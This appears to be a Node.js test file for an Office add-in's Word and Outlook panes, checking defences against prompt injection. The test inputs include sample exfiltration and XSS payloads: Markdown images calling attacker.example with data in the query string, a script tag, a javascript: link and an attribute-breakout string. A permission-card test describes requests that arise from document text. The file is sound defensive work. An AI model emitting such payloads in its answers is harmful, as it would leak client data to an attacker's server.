"use strict"
/**
 * Prompt injection, Word and Outlook panes: an answer never loads anything
 * by itself. The pane's Markdown (add-in/taskpane.js, escape-first) turns an
 * image into "[image: host]", links carry their full address on hover, and
 * both pages carry a Content-Security-Policy without remote image or
 * request sources.
 *
 *   node --test test/injection_pane.test.js
 */

const test = require('node:test')
const assert = require('assert')
const fs = require('fs')
const path = require('path')

const ADDIN = path.join(__dirname, '..', '..', 'add-in')

/** The pane's own Markdown functions, taken from taskpane.js as they are. */
function paneMarkdown() {
  const src = fs.readFileSync(path.join(ADDIN, 'taskpane.js'), 'utf8')
  const from = src.indexOf('function escHtml(')
  const to = src.indexOf('/* Permission card', from)
  assert.ok(from > 0 && to > from, 'the Markdown block was found in taskpane.js')
  // eslint-disable-next-line no-new-func
  return new Function(`${src.slice(from, to)}\nreturn { mdToHtml, escHtml }`)()
}

test('Word pane: a Markdown image is shown as "[image: host]", never as <img>', () => {
  const { mdToHtml } = paneMarkdown()
  const html = mdToHtml('Summary.\n\n![logo](https://attacker.example/p.gif?d=Alpine%20AG)\n\n| a | b |\n|---|---|\n| ![x](https://attacker.example/t.gif) | 1 |\n\n- ![y](https://attacker.example/l.gif)')
  assert.ok(!/<img/i.test(html), html)
  assert.match(html, /\[image: attacker\.example\] logo/)
  assert.ok(!/href="https:\/\/attacker\.example\/p\.gif/.test(html), 'not even a link for an image')
})

test('Word pane: raw HTML is escaped; links show their full address and only http(s) are links', () => {
  const { mdToHtml } = paneMarkdown()
  const html = mdToHtml('<img src="https://attacker.example/x.gif"> <script>alert(1)</script> [RIS](https://www.ris.bka.gv.at/x?y=1) [js](javascript:alert(1)) [q](https://a.example/"onmouseover="x)')
  assert.ok(!/<img|<script/i.test(html), html)
  assert.match(html, /<a href="https:\/\/www\.ris\.bka\.gv\.at\/x\?y=1" title="https:\/\/www\.ris\.bka\.gv\.at\/x\?y=1"/)
  assert.ok(!/href="javascript/i.test(html))
  assert.ok(!/" onmouseover=/i.test(html), 'quotes cannot break out of the attribute')
})

test('Word and Outlook panes carry a Content-Security-Policy: images and requests stay local', () => {
  for (const f of ['taskpane.html', 'outlook.html']) {
    const html = fs.readFileSync(path.join(ADDIN, f), 'utf8')
    const csp = (html.match(/http-equiv="Content-Security-Policy" content="([^"]+)"/) || [])[1] || ''
    assert.match(csp, /default-src 'self'/, f)
    assert.match(csp, /img-src 'self' data: blob:;/, f)
    assert.match(csp, /connect-src 'self'[^;]*;/, f)
    assert.ok(!/connect-src[^;]*(\*|http:)/.test(csp), `${f}: no wildcard or plain-http request target`)
    assert.match(csp, /object-src 'none'/, f)
    // The policy must come before any script.
    assert.ok(html.indexOf('Content-Security-Policy') < html.indexOf('<script'), f)
    assert.ok(!/<script>(?!\s*<\/script>)/.test(html), `${f}: no inline script`)
  }
})

test('Word pane: the permission card says why it asks (came up while reading; looks like client data)', () => {
  const permission = require(path.join(ADDIN, 'lib', 'permission.js'))
  const line = permission.riskLine({ risk: 'sends data to the web', caution: 'This request came up while reading a document (Lease.docx). Check it carefully: text in it may have asked for this.', warning: 'What would be sent contains the client\'s or a party\'s name.' })
  assert.match(line, /^What would be sent contains the client's or a party's name\. This request came up while reading a document \(Lease\.docx\)/)
  assert.match(line, /Nothing happens until you choose\.$/)
  assert.strictEqual(permission.riskLine({ risk: 'writes a file' }), 'It would save a file in your files folder. Nothing happens until you choose.')
})
